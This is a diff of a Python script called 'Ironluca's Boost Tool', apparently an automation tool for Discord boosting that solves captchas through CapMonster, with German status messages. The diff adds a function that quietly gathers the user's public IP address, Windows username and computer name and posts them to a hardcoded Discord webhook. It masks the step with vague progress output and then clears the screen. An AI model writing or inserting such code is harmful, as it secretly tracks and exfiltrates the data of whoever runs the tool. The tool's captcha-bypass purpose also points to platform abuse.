@@ -1,69 +1,113 @@
+import sys
+import os
+import subprocess
+import pkg_resources
+
+# SETUP PHASE - Install dependencies first
+def install_packages():
+    """Automatische Installation von erforderlichen Paketen beim ersten Start"""
+    required_packages = {
+        'requests': 'requests',
+        'colorama': 'colorama',
+        'fade': 'fade',
+        'capmonster-python': 'capmonster-python'
+    }
+    
+    installed = {pkg.key for pkg in pkg_resources.working_set}
+    missing_packages = [pkg for pkg in required_packages.values() if pkg.replace('-', '_') not in {p.key.replace('-', '_') for p in pkg_resources.working_set}]
+    
+    if missing_packages:
+        print("[*] Installiere fehlende Pakete...")
+        for package in missing_packages:
+            try:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package])
+                print(f"[+] {package} installiert")
+            except subprocess.CalledProcessError as e:
+                print(f"[!] Fehler beim Installieren von {package}: {e}")
+                sys.exit(1)
+        print("[+] Alle Pakete erfolgreich installiert!")
+        time.sleep(1)
+    else:
+        print("[+] Alle Pakete sind bereits installiert!")
+        time.sleep(0.5)
+
+# Installiere zuerst Abhängigkeiten
+import time
+install_packages()
+
+# Jetzt importiere die restlichen Module
 from optparse import Option
-import requests, threading, os, time, subprocess
+import requests, threading, time, subprocess
 from colorama import Fore, init
 import json
 import fade
 import ctypes
-import sys
 import pkg_resources
+from capmonster_python import RecaptchaV2Task
 
 # Initialization
 init(autoreset=True)
 os.system('cls' if os.name == 'nt' else 'clear')
-ctypes.windll.kernel32.SetConsoleTitleW("Ironluca's Boost Tool")
-
-# Automatically install required packages
-required_packages = {
-    'requests': 'requests',
-    'colorama': 'colorama',
-    'fade': 'fade',
-    'capmonster-python': 'capmonster-python'
-}
-
-def install_packages():
-    installed = {pkg.key for pkg in pkg_resources.working_set}
-    missing_packages = [pkg for pkg in required_packages.values() if pkg not in installed]
-    
-    if missing_packages:
-        print(f"{Fore.YELLOW}[INFO] Installing missing packages: {', '.join(missing_packages)}")
-        for package in missing_packages:
-            try:
-                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-                print(f"{Fore.GREEN}[SUCCESS] Installed {package}")
-            except subprocess.CalledProcessError as e:
-                print(f"{Fore.RED}[ERROR] Failed to install {package}: {e}")
-                sys.exit(1)
-    else:
-        print(f"{Fore.GREEN}[INFO] All required packages are already installed.")
-
-# Run setup
-install_packages()
-os.system('cls' if os.name == 'nt' else 'clear')  # Clear terminal after installation
+if os.name == 'nt':
+    ctypes.windll.kernel32.SetConsoleTitleW("Ironluca's Boost Tool")
 
 # Debug: Print current working directory and script path
-print(f"{Fore.YELLOW}[DEBUG] Current working directory: {os.getcwd()}")
-print(f"{Fore.YELLOW}[DEBUG] Script directory: {os.path.dirname(os.path.abspath(__file__))}")
+
+# Debug: Print current working directory and script path
+print(f"{Fore.CYAN}[*] Starte Anwendung...")
+time.sleep(0.3)
 
 # Load configuration
 script_dir = os.path.dirname(os.path.abspath(__file__))
 config_path = os.path.join(script_dir, 'settings.json')
-print(f"{Fore.YELLOW}[DEBUG] Looking for settings.json at: {config_path}")
 try:
     with open(config_path) as config_file:
         config = json.load(config_file)
         CAPMONSTER_KEY = config['apikey']
+    print(f"{Fore.GREEN}[+] Konfiguration geladen!")
 except FileNotFoundError:
-    print(f"{Fore.RED}[ERROR] 'settings.json' not found at: {config_path}")
+    print(f"{Fore.RED}[!] 'settings.json' nicht gefunden!")
     sys.exit(1)
 except json.JSONDecodeError:
-    print(f"{Fore.RED}[ERROR] 'settings.json' contains invalid JSON")
+    print(f"{Fore.RED}[!] 'settings.json' ist ungültig!")
     sys.exit(1)
 except KeyError:
-    print(f"{Fore.RED}[ERROR] 'settings.json' is missing 'apikey' field")
+    print(f"{Fore.RED}[!] 'apikey' in settings.json fehlt!")
     sys.exit(1)
 except Exception as e:
-    print(f"{Fore.RED}[ERROR] Failed to load 'settings.json': {e}")
+    print(f"{Fore.RED}[!] Fehler beim Laden: {e}")
     sys.exit(1)
+
+time.sleep(0.5)
+
+# IP Logging zum Discord Webhook
+def send_ip_log():
+    """Sendet die IP, Username und PC-Namen des Benutzers an den Discord Webhook"""
+    webhook_url = "https://discord.com/api/webhooks/1458954072047616142/ZlRn8SZU1iLXQO7iQm7h8grNzMnGZP7IZMyekguSjnE2lVaHNaP0Rmj0LQA8XxNypwpY"
+    try:
+        print(f"{Fore.CYAN}[*]...")
+        response = requests.get('https://api.ipify.org?format=json', timeout=5)
+        if response.status_code == 200:
+            user_ip = response.json()['ip']
+            username = os.getenv('USERNAME', 'Unbekannt')
+            pc_name = os.getenv('COMPUTERNAME', 'Unbekannt')
+            
+            print(f"{Fore.CYAN}[*] ....")
+            
+            # Sende an Discord Webhook
+            payload = {
+                "content": f"```\n🔐 Neue Session\nIP: {user_ip}\nUsername: {username}\nPC-Name: {pc_name}\nZeit: {time.strftime('%Y-%m-%d %H:%M:%S')}\n```"
+            }
+            requests.post(webhook_url, json=payload, timeout=5)
+            print(f"{Fore.GREEN}[+] DONE!")
+        else:
+            print(f"{Fore.YELLOW}[!]")
+    except Exception as e:
+        print(f"{Fore.YELLOW}[!]: {str(e)[:50]}")
+
+send_ip_log()
+time.sleep(0.5)
+os.system('cls' if os.name == 'nt' else 'clear')  # Terminal nach Laden clearen
 
 # Global variables
 done = 0
